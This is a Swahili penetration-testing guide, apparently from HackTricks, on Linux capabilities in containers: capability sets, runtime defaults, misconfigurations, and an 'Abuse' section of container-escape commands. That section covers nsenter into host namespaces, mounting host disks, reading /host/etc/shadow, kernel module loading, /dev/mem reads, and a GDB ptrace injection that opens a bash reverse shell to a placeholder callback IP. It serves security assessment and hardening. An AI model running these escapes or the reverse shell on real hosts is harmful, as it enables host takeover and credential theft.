# Linux Capabilities Katika Containers

{{#include ../../../../banners/hacktricks-training.md}}

## Muhtasari

Linux capabilities ni mojawapo ya vipengele muhimu zaidi vya container security kwa sababu yanajibu swali fiche lakini la msingi: **"root" inamaanisha nini hasa ndani ya container?** Kwenye mfumo wa kawaida wa Linux, UID 0 kihistoria ilimaanisha seti pana sana ya privileges. Kwenye kernels za kisasa, privilege hiyo imegawanywa katika vitengo vidogo vinavyoitwa capabilities. Process inaweza kuendeshwa kama root na bado ikakosa operations nyingi zenye nguvu ikiwa capabilities husika zimeondolewa. <sup>[[1]](#references)</sup>

Containers hutegemea sana tofauti hii. Workloads nyingi bado huanzishwa kama UID 0 ndani ya container kwa sababu za compatibility au urahisi. Bila capability dropping, hilo lingekuwa hatari sana. Kwa capability dropping, root process iliyo ndani ya container bado inaweza kutekeleza in-container tasks nyingi za kawaida, huku ikizuiwa kufanya kernel operations nyeti zaidi. Ndiyo maana container shell inayoonyesha `uid=0(root)` haimaanishi moja kwa moja "host root" au hata "broad kernel privilege". Capability sets huamua thamani halisi ya root identity hiyo.

Kwa full Linux capability reference na mifano mingi ya abuse, angalia:

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Uendeshaji

Capabilities hufuatiliwa katika sets kadhaa, zikiwemo permitted, effective, inheritable, ambient, na bounding sets. Kwa assessments nyingi za containers, semantics halisi za kernel za kila set si muhimu mara moja kuliko swali la kimatendo: **ni privileged operations zipi ambazo process hii inaweza kufanikiwa kutekeleza sasa hivi, na ni privilege gains zipi za baadaye ambazo bado zinawezekana?** <sup>[[1]](#references)</sup>

Sababu ya umuhimu huu ni kwamba breakout techniques nyingi kwa kweli ni matatizo ya capabilities yaliyojificha kama matatizo ya containers. Workload yenye `CAP_SYS_ADMIN` inaweza kufikia kiasi kikubwa cha kernel functionality ambacho normal container root process haipaswi kugusa. Workload yenye `CAP_NET_ADMIN` huwa hatari zaidi ikiwa pia inashiriki host network namespace. Workload yenye `CAP_SYS_PTRACE` huwa ya kuvutia zaidi ikiwa inaweza kuona host processes kupitia host PID sharing. Katika Docker au Podman, hii inaweza kuonekana kama `--pid=host`; katika Kubernetes kwa kawaida huonekana kama `hostPID: true`.

Kwa maneno mengine, capability set haiwezi kutathminiwa ikiwa peke yake. Lazima isomwe pamoja na namespaces, seccomp, na MAC policy.

## Lab

Njia ya moja kwa moja sana ya kukagua capabilities ndani ya container ni:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Unaweza pia kulinganisha container yenye vizuizi zaidi na ile iliyo na capabilities zote:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Ili kuona athari ya nyongeza finyu, jaribu kuondoa kila kitu na kisha uongeze tena capability moja pekee:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Majaribio haya madogo husaidia kuonyesha kwamba runtime haibadilishi tu boolean inayoitwa "privileged". Inaunda sehemu halisi ya privileges inayopatikana kwa process.

## Capabilities Zenye Hatari Kubwa

Capabilities huwa primitives za escape tu pale operesheni yake inapofikia **resource inayodhibitiwa na host**. Mchanganyiko unaojirudia wa hatari kubwa ni:

- **`CAP_SYS_ADMIN`** pamoja na PID ya host, block device, au njia ya writable ya kernel-control. Kujiunga na target mount namespace pia kunahitaji `CAP_SYS_CHROOT`; kumount filesystem inayotegemea block kunahitaji `CAP_SYS_ADMIN` katika initial user namespace.
- **`CAP_SYS_PTRACE`** pamoja na uwezo wa kuona PID za host na host process inayoweza ku-attachiwa. `CAP_SYS_ADMIN` haihitajiki kwa ptrace injection.
- **`CAP_DAC_OVERRIDE` au `CAP_DAC_READ_SEARCH`** pamoja na host filesystem inayoweza kufikiwa. Capabilities hizi hupita ukaguzi tofauti wa DAC lakini hazitengenezi mtazamo wa host filesystem.
- **`CAP_SYS_MODULE`** katika initial user namespace pamoja na module inayokubalika na inayooana na kernel. Linux containers za kawaida hushiriki node kernel; VM au userspace-kernel runtimes hubadilisha mpaka huo.
- **`CAP_MKNOD`** katika initial user namespace pamoja na host device halisi ambayo device cgroup tayari inaruhusu. Kuunda node hakupiti device cgroup.
- **`CAP_SYS_RAWIO`** pamoja na memory, I/O-port, PCI, au device-control interface iliyowazi na inayoweza kutumika.
- **`CAP_SYS_BOOT`** pamoja na initial PID namespace kwa reboot ya host, au njia ya kexec inayoweza kutumika na iliyoruhusiwa kwa kernel replacement.
- **`CAP_NET_ADMIN`** katika host network namespace kwa udhibiti wa moja kwa moja wa network-state ya node. **`CAP_NET_RAW`** inaweza kushiriki katika protocol-specific escape, lakini raw sockets pekee si shell ya node.

`CAP_SYS_CHROOT` haijaorodheshwa kimakusudi kama standalone escape capability. Inaweza kuhitajika na mount-namespace `setns()` na inaweza kufanya host tree ambayo tayari inafikika iwe rahisi kutumia, lakini `chroot()` pekee haionyeshi tree hiyo wala haitoi filesystem permissions mpya. Vivyo hivyo, `CAP_BPF` na `CAP_PERFMON` hutoa telemetry yenye nguvu na attack surface ya kernel, lakini bila kernel flaw tofauti, operesheni zake za kawaida si generic container escapes.

## Matumizi ya Runtime

Docker, Podman, stacks zinazotegemea containerd, na CRI-O zote hutumia capability controls, lakini defaults na management interfaces hutofautiana. Docker huzionyesha moja kwa moja kupitia flags kama `--cap-drop` na `--cap-add`. Podman hutoa controls zinazofanana na mara nyingi huzichanganya na rootless execution kama safety layer ya ziada. Kubernetes huonyesha capability additions na drops kupitia `securityContext` ya Pod au container; runtimes za kiwango cha chini huonyesha sets zinazotokana na hayo katika OCI runtime configuration. System-container environments kama LXC na Incus pia hutegemea capability control, lakini host integration yao pana inaweza kuwashawishi operators kulegeza defaults kwa kiwango kikubwa zaidi kuliko ambavyo wangefanya kwa application container. <sup>[[2]](#references)</sup> <sup>[[3]](#references)</sup> <sup>[[4]](#references)</sup> <sup>[[5]](#references)</sup> <sup>[[6]](#references)</sup>

Kanuni hiyo hiyo inatumika kwa zote: capability ambayo kitaalamu inawezekana kupewa si lazima iwe capability inayopaswa kupewa. Incidents nyingi za ulimwengu halisi huanza operator anapoongeza capability kwa sababu tu workload ilishindwa kufanya kazi chini ya configuration yenye vizuizi zaidi, na team ilihitaji quick fix.

## Misconfigurations

Kosa lililo wazi zaidi ni **`--cap-add=ALL`** katika Docker/Podman-style CLIs, lakini si kosa pekee. Kwa vitendo, tatizo linalotokea mara nyingi zaidi ni kutoa capability moja au mbili zenye nguvu sana, hasa `CAP_SYS_ADMIN`, ili "application ifanye kazi" bila pia kuelewa athari za namespace, seccomp, na mount. Failure mode nyingine ya kawaida ni kuchanganya capabilities za ziada na host namespace sharing. Katika Docker au Podman hii inaweza kuonekana kama `--pid=host`, `--network=host`, au `--userns=host`; katika Kubernetes exposure inayolingana kwa kawaida huonekana kupitia workload settings kama `hostPID: true` au `hostNetwork: true`. Kila moja ya michanganyiko hiyo hubadilisha kile ambacho capability inaweza kweli kuathiri.

Pia ni kawaida kuona administrators wakiamini kwamba kwa sababu workload si `--privileged` kikamilifu, bado ina vizuizi vya maana. Wakati mwingine hilo ni kweli, lakini wakati mwingine effective posture tayari iko karibu vya kutosha na privileged kiasi kwamba tofauti hiyo haijalishi tena kiutendaji.

## Abuse

Anza kwa kurekodi effective sets, user-namespace mapping, seccomp state, namespaces, mounts, na devices. Jina la capability bila context hii halithibitishi escape:
```bash
capsh --print
grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
ls -l /proc/self/ns
findmnt
```
### `CAP_SYS_ADMIN`: namespaces na block devices

Kwa uwezo wa kuona host PID, `CAP_SYS_ADMIN` inaweza kuingia kwenye host namespaces. Operesheni ya mount-namespace pia inahitaji `CAP_SYS_CHROOT` katika user namespace ya caller.

**Kagua capability na confinement:**
```bash
capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
```
**Enumerate target:** thibitisha host PID sharing kutoka kwenye container/Pod configuration au orodha ya host processes iliyo wazi, kisha kagua target namespaces. PID 1 ya ndani hupatikana pia kwenye private PID namespaces, kwa hivyo uwepo wake pekee hauthibitishi host PID sharing.
```bash
ps -eo pid,user,comm,args
target_pid=1
tr '\0' ' ' <"/proc/${target_pid}/cmdline"; echo
ls -l "/proc/${target_pid}/ns/"{mnt,pid,net,ipc,uts,user}
```
**Exploit njia ya namespace:**
```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh
id
findmnt /
```
Ukaguzi wa capabilities lazima ufaulu katika user namespaces zinazomiliki targets. `--pid=host` au Kubernetes `hostPID: true` hutoa mwonekano; haitoi capabilities.

Kwa njia mbadala ya block-device, **enumerate** candidates, kisha **exploit** filesystem inayofikika kwa ku-mount candidate iliyothibitishwa katika hali ya read-only kwanza:
```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
node_root_device=/dev/vda1  # Replace with the validated candidate.
mkdir -p /mnt/hostdisk
mount -o ro "${node_root_device}" /mnt/hostdisk
cat /mnt/hostdisk/etc/hostname
umount /mnt/hostdisk
```
Node ya kifaa lazima iwepo, device cgroup lazima iruhusu hilo, na mounts za block filesystem zinahitaji `CAP_SYS_ADMIN` katika initial user namespace. Host root ambayo tayari imewekwa kwa bind mount kwenye `/host` ni ufikiaji wa host **bila** `CAP_SYS_ADMIN`; `chroot /host` ni urahisishaji tu na inahitaji `CAP_SYS_CHROOT` kando.

### Host root inayoweza kufikiwa: utekelezaji wa filesystem wa moja kwa moja

Ikiwa host root tayari imewekwa kwenye `/host`, kwanza thibitisha mount hiyo kisha utumie ufikiaji uliopo moja kwa moja. Njia hii haitegemei `CAP_SYS_ADMIN`:
```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
ls -la /host
chroot /host /bin/bash
```
Ikiwa `chroot()` haipatikani lakini binary ya host inaoana na architecture na loader ya container, mara nyingi inaweza kuitwa kupitia tree iliyomountiwa badala yake:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
Usomaji na uandikaji wa moja kwa moja chini ya `/host` tayari ni compromise ya mfumo wa faili wa host. `chroot()` au kutekeleza binary ya host hufanya tu ufikiaji huo uwe rahisi zaidi; hakuna operesheni kati ya hizo inayounda mount ya host au kupita mount ya kusoma pekee au sera ya MAC.

### `CAP_SYS_PTRACE`: injection ya michakato ya host

Kwa mwonekano wa PID za host na `CAP_SYS_PTRACE` katika user namespace ya target, GDB inaweza kufanya mchakato wa host ulioidhinishwa uite `system()`. `CAP_SYS_ADMIN` haihitajiki.

**Kagua uwezo huo na vidhibiti vya attachment:**
```bash
capsh --print | grep cap_sys_ptrace
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
```
**Enumerate na chagua target ya disposable:** thibitisha host PID sharing kupitia configuration au orodha isiyo na utata ya node processes; usiwahi kuchagua PID 1 au daemon muhimu.
```bash
ps -eo pid,user,comm,args
target_pid=<approved-lab-process-pid>
readlink "/proc/${target_pid}/exe"
grep -E '^(Name|Uid|Gid|TracerPid|NoNewPrivs|Seccomp):' \
"/proc/${target_pid}/status"
```
**Exploit process iliyochaguliwa:**
```bash
# On a reachable assessment system:
nc -lvnp 4444

# In the container:
callback_ip=192.0.2.10
callback_port=4444
gdb -q -nx -batch -p "${target_pid}" \
-ex "call (int) system(\"bash -c 'bash -i >& /dev/tcp/${callback_ip}/${callback_port} 0>&1'\")" \
-ex detach
```
Lengo lazima liweze kuunganishwa na liwe na alama ya `system()` inayoweza kutumika pamoja na njia ya Bash payload. Yama, hali ya non-dumpable, seccomp, user namespaces, na sera ya MAC zinaweza kuzuia chain. GDB husimamisha lengo ikiwa imeunganishwa, kwa hivyo tumia mchakato wa maabara unaoweza kutupwa pekee.

### `CAP_DAC_OVERRIDE` na `CAP_DAC_READ_SEARCH`: faili za host zilizolindwa

Uwezo huu hauonyeshi filesystem ya host. Ikiwa `/host` tayari ni mount ya host, `CAP_DAC_READ_SEARCH` inaweza kupita ukaguzi wa DAC wa kusoma/kutafuta, na `CAP_DAC_OVERRIDE` inaweza pia kupita ukaguzi wa kawaida wa kuandika:

**Kagua capabilities:**
```bash
capsh --print | grep -E 'cap_dac_override|cap_dac_read_search'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```
**Orodhesha mfumo wa faili wa host ulio wazi na ruhusa lengwa:**
```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
stat -c 'owner=%u:%g mode=%A path=%n' \
/host/etc/shadow /host/root /host/var/lib/kubelet 2>/dev/null
find /host/var/lib/kubelet -maxdepth 3 -type f -readable -ls 2>/dev/null | head
```
**Jaribu read na write bypasses** katika labu ya kutupwa:
```bash
head -n 1 /host/etc/shadow
printf 'DAC proof from uid=%s\n' "$(id -u)" >/host/root/ht-dac-proof
rm /host/root/ht-dac-proof
```
Mount ya kusoma-tu na sheria za LSM bado hutumika. `CAP_DAC_READ_SEARCH` pia inaidhinisha `open_by_handle_at()`, lakini breakout kama Shocker inahitaji pia file descriptor ya mount kwa filesystem ileile ya msingi, handles halali au zinazoweza kugunduliwa, mpangilio unaoendana wa filesystem/storage, na kutokuwepo kwa kizuizi cha runtime au LSM. Haitawezesha ufikiaji wa kiholela kwa kila filesystem iliyo nje ya mount namespace.

### `CAP_SYS_MODULE`: utekelezaji kwenye kernel iliyoshirikiwa

Katika Linux container ya kawaida, module inayokubaliwa huendeshwa kwenye kernel ya host iliyoshirikiwa.

**Kagua capability na scope ya user namespace:**
```bash
capsh --print | grep cap_sys_module
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**Orodhesha mahitaji ya awali ya upakiaji wa module:**
```bash
uname -r
cat /proc/sys/kernel/modules_disabled
cat /sys/kernel/security/lockdown 2>/dev/null
grep -E 'CONFIG_MODULES=|CONFIG_MODULE_SIG(_FORCE)?=' \
"/boot/config-$(uname -r)" 2>/dev/null
modinfo /lab/ht-proof.ko
```
**Tumia Exploit pekee kwa proof module inayooana na iliyokaguliwa awali kwenye node ya kutupwa:**
```bash
insmod /lab/ht-proof.ko
grep '^ht_proof ' /proc/modules
rmmod ht_proof
```
Capability lazima iwe effective katika initial user namespace. Toleo na usanidi wa kernel, module signatures, lockdown, seccomp, na sera ya LSM lazima ziruhusu upakiaji huo. Kata, gVisor, Hyper-V isolation, na runtimes zinazofanana hubadilisha kernel boundary ambayo workload hufikia.

### `CAP_MKNOD`: create a permitted device handle

`CAP_MKNOD` huunda device node lakini haipiti device cgroup. Uundaji wa device haujawekewa namespace, hivyo capability lazima iwe effective katika initial user namespace.

**Kagua capability na scope ya user namespace:**
```bash
capsh --print | grep cap_mknod
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**Orodhesha vifaa halisi, nambari zake za major/minor, na allowlist yoyote inayoonekana ya cgroup-v1:**
```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS 2>/dev/null
for device_file in /sys/class/block/*/dev; do
printf '%s %s\n' "${device_file}" "$(cat "${device_file}")"
done
cat /sys/fs/cgroup/devices/devices.list 2>/dev/null
```
**Exploit candidate wa ext-family uliothibitishwa kwa read-only:**
```bash
node_block_name=vda1                       # Replace with the validated candidate.
device_numbers=$(cat "/sys/class/block/${node_block_name}/dev")
device_major=${device_numbers%:*}
device_minor=${device_numbers#*:}
mknod /dev/ht-node-root b "${device_major}" "${device_minor}"
debugfs -R 'cat /etc/hostname' /dev/ht-node-root
rm /dev/ht-node-root
```
Mifumo mingine ya faili inahitaji zana inayolingana ya kusoma pekee; kuweka kifaa pia kunahitaji `CAP_SYS_ADMIN`. `Operation not permitted` wakati wa kufungua node iliyoundwa kwa kawaida huashiria kuwa device cgroup bado inakizuia. Chini ya cgroup v2, ufikiaji wa kifaa kwa kawaida hutekelezwa kwa BPF na hakuna faili ya `devices.list`, hivyo kufungua kwa mafanikio ndilo jaribio la msingi.

### `CAP_SYS_RAWIO`: exposed raw-I/O interface

Hakuna payload ya jumla inayoweza kutumika kila mahali: anwani halali na athari hutegemea hardware na usanidi wa kernel.

**Kagua capability na upeo wa user-namespace:**
```bash
capsh --print | grep cap_sys_rawio
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**Orodhesha interfaces ghafi, hardware, na drivers zilizo wazi:**
```bash
ls -l /dev/mem /dev/port 2>/dev/null
lspci -nnk 2>/dev/null
find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
```
**Tumia Exploit tu ikiwa kuna uthibitisho ulioidhinishwa kwa kifaa na anuwai ya anwani iliyotambuliwa.** Ikiwa `/dev/mem` ndiyo interface iliyoidhinishwa na maabara, template hii inathibitisha ufichuaji wa node-memory bila kuchapisha yaliyomo:
```bash
approved_physical_address=<lab-provided-decimal-address>
approved_byte_count=<lab-provided-size>
dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
skip="${approved_physical_address}" count="${approved_byte_count}" status=none
wc -c /tmp/ht-rawio-proof.bin
sha256sum /tmp/ht-rawio-proof.bin
rm /tmp/ht-rawio-proof.bin
```
Anwani lazima itoke kwenye ramani ya hardware ya lab kwa sababu kusoma baadhi ya maeneo ya MMIO kunaweza kusababisha side effects. Amri ya jumla ya memory-write inaweza kupotosha na kuwa si salama: anwani hiyo hiyo inaweza kuwa isiyo na madhara kwenye mashine moja na kudhibiti hardware au memory ya kernel kwenye mashine nyingine. Device cgroups, ruhusa za filesystem, `/dev/mem` yenye vizuizi vikali, kernel lockdown, virtualization, na sera ya LSM kwa kawaida huzuia access yenye manufaa.

### `CAP_SYS_BOOT`: namespace reboot au kernel replacement

Katika private PID namespace, `reboot()` husitisha init process ya namespace hiyo badala ya kureboot host. Kwa hivyo, athari ya host reboot inahitaji initial PID namespace, kwa kawaida kupitia host PID sharing. Njia ya kexec pia inahitaji kernel image inayooana na lockdown/signature policy inayoruhusu:

**Kagua capability:**
```bash
capsh --print | grep cap_sys_boot
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**Orodhesha masharti ya awali ya PID-namespace na kexec:** thibitisha ushirikishaji wa PID za host kutoka kwenye usanidi wa workload, kwa sababu kiungo cha PID namespace pekee hakionyeshi ikiwa ni namespace ya awali ya node.
```bash
ps -p 1 -o pid,user,comm,args
readlink /proc/self/ns/pid
command -v kexec 2>/dev/null
cat /sys/kernel/security/lockdown 2>/dev/null
```
**Fanya Exploit tu wakati kuanzisha upya node ya maabara inayoweza kutupwa ni zoezi lililoelezwa wazi:**
```bash
sync
reboot -f
```
Usiendeshe amri hiyo au kupakia kernel kwenye node inayoshirikiwa kwa madhumuni ya kuthibitisha capability pekee. Katika private PID namespace, inasitisha tu init process ya namespace hiyo na haionyeshi athari kwa host.

### `CAP_NET_ADMIN` na `CAP_NET_RAW`: njia za mtandao wa host

`CAP_NET_ADMIN` huathiri network namespace ya sasa pekee.

**Kagua capabilities na confinement:**
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```
**Orodhesha mtandao wa sasa na uthibitishe host networking kutoka kwenye usanidi wa workload:**
```bash
readlink /proc/self/ns/net
ip -brief address
ip route
nft list ruleset 2>/dev/null || iptables-save 2>/dev/null
```
**Tumia `CAP_NET_ADMIN` kwa njia inayoweza kurejeshwa:** ukiwa na host networking, interface ya muda ni interface ya node.
```bash
ip link add ht-net-admin-proof type dummy
ip addr add 192.0.2.1/32 dev ht-net-admin-proof
ip link set ht-net-admin-proof up
ip -brief addr show ht-net-admin-proof
ip link delete ht-net-admin-proof
```
`CAP_NET_RAW` inaruhusu RAW na PACKET sockets lakini si host shell ya jumla. Ili **enumerate** chain ya GCE iliyoandikwa, angalia njia ya metadata na rekodi ikiwa traffic ya guest-agent iliyo wazi inaweza kuonekana:
```bash
ip route get 169.254.169.254
tcpdump -ni any -c 20 'host 169.254.169.254'
```
Ikiwa masharti yanayolingana yapo, **exploit** mnyororo unaotegemea mazingira kama ilivyoandikwa katika [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html): nasa hali ya ombi na mfuatano, ingiza response ya metadata iliyoghushiwa iliyo na SSH key, kisha thibitisha ufikiaji wa host. Mnyororo huu ulihitaji root, host networking, `CAP_NET_ADMIN`, `CAP_NET_RAW`, trafiki ya metadata ya GCE isiyosimbwa, na ombi la guest-agent linaloweza kushindaniwa; transport ya kisasa au tabia ya agent inaweza kuuvuruga.

## Ukaguzi

Lengo la ukaguzi wa capabilities si kutupa tu thamani ghafi, bali kuelewa ikiwa mchakato una privilege ya kutosha kufanya namespace na hali yake ya mount kuwa hatari.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Kinachovutia hapa:

- `capsh --print` ndiyo njia rahisi zaidi ya kubaini capabilities zenye hatari kubwa kama vile `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin`, au `cap_sys_module`.
- Mstari wa `CapEff` katika `/proc/self/status` unakuambia ni nini kinachotumika kwa ufanisi sasa, si tu kile kinachoweza kupatikana katika seti nyingine.
- Capability dump huwa muhimu zaidi ikiwa container pia inashiriki host PID, network, au user namespaces, au ina host mounts zinazoandikika.

Baada ya kukusanya taarifa ghafi za capabilities, hatua inayofuata ni kuzitafsiri. Jiulize ikiwa process ni root, ikiwa user namespaces ziko active, ikiwa host namespaces zinashirikiwa, ikiwa seccomp inatekelezwa, na ikiwa AppArmor au SELinux bado inaizuia process. Capability set peke yake ni sehemu tu ya picha nzima, lakini mara nyingi ndiyo sehemu inayoeleza kwa nini container breakout moja inafanya kazi na nyingine inashindwa ikiwa zina starting point inayoonekana kuwa sawa.

## Runtime Defaults

| Runtime / platform | Hali ya default | Tabia ya default | Kudhoofisha kwa mikono kunakotumika mara kwa mara |
| --- | --- | --- | --- |
| Docker Engine | Capability set iliyopunguzwa kwa default | Docker huhifadhi allowlist ya default ya capabilities na kuondoa zilizobaki | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Capability set iliyopunguzwa kwa default | Podman containers hazina privileges kwa default na hutumia capability model iliyopunguzwa | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Hurithi runtime defaults isipobadilishwa | Ikiwa hakuna `securityContext.capabilities` zilizobainishwa, container hupata default capability set kutoka kwa runtime | `securityContext.capabilities.add`, kushindwa kutumia `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O under Kubernetes | Kwa kawaida runtime default | Set inayotumika kwa ufanisi hutegemea runtime pamoja na Pod spec | sawa na safu ya Kubernetes; direct OCI/CRI configuration inaweza pia kuongeza capabilities waziwazi |

Kwa Kubernetes, jambo muhimu ni kwamba API haifafanui capability set moja ya default inayotumika kila mahali. Ikiwa Pod haiongezi au kuondoa capabilities, workload hurithi runtime default ya node hiyo.

## References

- [1] [capabilities(7) - Linux manual page](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [2] [Open Container Initiative - Linux container configuration](https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md#process)
- [3] [Docker Docs - Runtime privilege and Linux capabilities](https://docs.docker.com/engine/containers/run/#runtime-privilege-and-linux-capabilities)
- [4] [Kubernetes Documentation - Set capabilities for a container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/#set-capabilities-for-a-container)
- [5] [Podman documentation - `--cap-add` and `--cap-drop`](https://docs.podman.io/en/latest/markdown/podman-run.1.html#cap-add-capability)
- [6] [Incus documentation - Security](https://linuxcontainers.org/incus/docs/main/explanation/security/)
{{#include ../../../../banners/hacktricks-training.md}}
